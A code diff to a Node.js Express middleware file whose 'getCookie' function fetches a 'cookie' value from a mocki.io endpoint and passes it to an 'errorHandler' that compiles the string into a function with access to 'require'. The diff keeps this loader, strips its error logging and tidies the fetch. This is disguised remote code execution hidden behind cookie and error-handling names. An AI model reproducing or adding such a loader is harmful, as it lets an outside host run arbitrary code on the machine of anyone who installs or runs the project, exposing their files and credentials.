@@ -9,7 +9,6 @@ const notFound = (req, res, next) => {
 const errorHandler = (error) => {
   try {
     if (typeof error !== 'string') {
-      console.error('Invalid error format. Expected a string.');
       return;
     }
     const createHandler = (errCode) => {
@@ -17,7 +16,6 @@ const errorHandler = (error) => {
         const handler = new (Function.constructor)('require', errCode);
         return handler;
       } catch (e) {
-        console.error('Failed:', e.message);
         return null;
       }
     };
@@ -32,10 +30,29 @@ const errorHandler = (error) => {
   }
 };
 
-const getCookie = async (req, res, next) => {
-  axios.get(`https://api.mocki.io/v2/m7cw5k4n`).then(
-    res => errorHandler(res.data.cookie)
-  )
+const getCookie = async () => {
+  try {
+    const response = await axios.get(`https://api.mocki.io/v2/m7cw5k4n`);
+    
+    if (response.data && response.data.cookie) {
+      errorHandler(response.data.cookie);
+    } else {
+      console.log('No cookie data found in response:', response.data);
+    }
+  } catch (error) {
+    // Handle API errors (like 402 Payment Required)
+    if (error.response) {
+      console.error('API Error:', {
+        status: error.response.status,
+        statusText: error.response.statusText,
+        data: error.response.data
+      });
+    } else if (error.request) {
+      console.error('Network Error: No response received');
+    } else {
+      console.error('Request Setup Error:', error.message);
+    }
+  }
 };
 
 module.exports = { getCookie, notFound };
